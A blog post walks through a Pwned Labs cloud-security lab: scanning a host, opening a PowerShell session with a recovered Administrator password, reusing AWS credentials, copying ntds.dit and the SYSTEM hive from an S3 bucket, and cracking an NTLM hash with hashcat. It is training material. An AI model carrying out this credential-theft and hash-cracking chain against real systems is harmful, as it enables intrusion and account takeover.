---
title: '100 Days of Cloud Security - Day 59: PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 2'
date: '2026-01-07'
author: 'Venkata Pathuri'
excerpt: 'Day 59 of my cloud security journey - PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 59: PWNED LABS - Leverage Insecure Storage and Backups for Profit - Part 2

## Overview

Welcome back to Day 59 of our cloud security journey! Building on the skills we honed in Day 58, we delve deeper into the realm of insecure storage and backup management. Today, we will explore how attackers can exploit misconfigured cloud resources, specifically focusing on AWS S3 buckets. By the end of this session, you’ll be equipped with the knowledge to recognize vulnerabilities in cloud environments and understand the vital steps to mitigate these risks.

## Learning Objectives

Today’s exploration will help you master several critical skills in cloud security. You will learn how to enumerate IAM and S3 bucket policies effectively, extract and crack password hashes, and understand the implications of insecure storage. We're going to use PowerShell for remote access and AWS CLI for resource management, ensuring you become proficient in handling real-world scenarios. Additionally, we will discuss best practices to prevent such vulnerabilities, empowering you to enhance your security posture.

## Deep Dive

### Network Connectivity Verification

Before we dive into accessing sensitive data, it's essential to confirm that our target instance is reachable. Using an Nmap scan, we can check if the necessary ports are open. This step is crucial for ensuring that our subsequent actions have a successful foundation.

**Example Nmap Command:**

```bash
nmap -p 22,3389 54.226.75.125
```

You should see results indicating that the host is active and that necessary ports like SSH (22) and RDP (3389) are open.

### Windows Access via PowerShell

Now, with the password we retrieved in Part 1 (`UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!`), we can initiate a remote session to the Windows machine. 

PowerShell provides a secure way to create credential objects and establish sessions. Here’s how you do it:

```PowerShell
$password   = ConvertTo-SecureString 'UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Enter-PSSession -ComputerName 54.226.75.125 -Credential $credential -Authentication Negotiate
```

If you encounter issues, ensure that PowerShell Remoting is enabled on the target machine and that the IP address is included in TrustedHosts.

### Privilege Escalation & Lateral Movement

Once we have access to the `Administrator` desktop, we can search for any AWS configuration files. In our scenario, we found credentials for another user, `it-admin`, which allows us elevated access.

Using the AWS CLI, we verify our identity with the following command:

```bash
aws sts get-caller-identity --profile pwl-admin --no-cli-pager
```

The output shows that we have successfully assumed the role of `it-admin` with access to sensitive resources.

### Sensitive Data Exfiltration

With our new credentials, we can re-enumerate the S3 bucket named `hl-it-admin`. A deeper investigation reveals a `backup-2807` directory containing critical Active Directory files, previously hidden from our `contractor` user.

To list the directory contents, we run:

```bash
aws s3 ls hl-it-admin --recursive --profile pwl-admin --no-cli-pager
```

Upon seeing files like `ntds.dit` and the `SYSTEM` registry hive, we proceed to exfiltrate these files to analyze them locally:

```bash
aws s3 cp s3://hl-it-admin/backup-2807/ . --recursive --profile pwl-admin --no-cli-pager
```

### Hash Cracking

Now that we have the `ntds.dit` and the `SYSTEM` files, we can extract NTLM hashes using tools like `secretsdump.py`. For our case, we identified the Administrator hash:

```
58a478135a93ac3bf058a5ea0e8fdb71
```

To crack this hash, we employ Hashcat with a commonly used wordlist, `rockyou.txt`:

```bash
hashcat -a0 -m 1000 "58a478135a93ac3bf058a5ea0e8fdb71" rockyou.txt
```

If successful, the output reveals the cracked Administrator password: **Password123**.

## Hands-On Practice

To solidify your learning, follow these steps:

1. **Verify Network Connectivity**: Use Nmap to check if the target instance is reachable.
2. **Access Windows via PowerShell**: Use the provided PowerShell commands to establish a remote session.
3. **Escalate Privileges**: After accessing the `Administrator` account, locate AWS credentials and set up a new profile.
4. **Exfiltrate and Analyze Data**: List and copy sensitive files from the S3 bucket.
5. **Crack Password Hashes**: Use `secretsdump.py` and Hashcat to extract and crack hashes.

### Common Pitfalls:
- Ensure that PowerShell Remoting is enabled and configured correctly.
- Make sure to have the necessary AWS permissions to access and enumerate S3 buckets.
- Double-check your syntax in both PowerShell and AWS CLI commands.

## Key Takeaways

Today, you have taken major steps towards understanding cloud security vulnerabilities, particularly focusing on insecure storage and backup exploitation. By mastering the skills of privilege escalation, data exfiltration, and hash cracking, you have equipped yourself with essential tools to identify and mitigate risks in cloud environments. Remember, the ability to secure data is not just about technology, but also about understanding the attacker’s mindset to preemptively protect your resources.

## Real-World Applications

Understanding these concepts is crucial in production environments where sensitive data is stored in cloud infrastructures. Organizations often overlook S3 bucket permissions and IAM roles, leading to potential data breaches. By applying the knowledge gained today, you can advocate for stricter access controls, regular audits, and better backup management practices, ultimately enhancing your organization's security posture.

---
**Journey Progress:** 59/100 Days Complete 🚀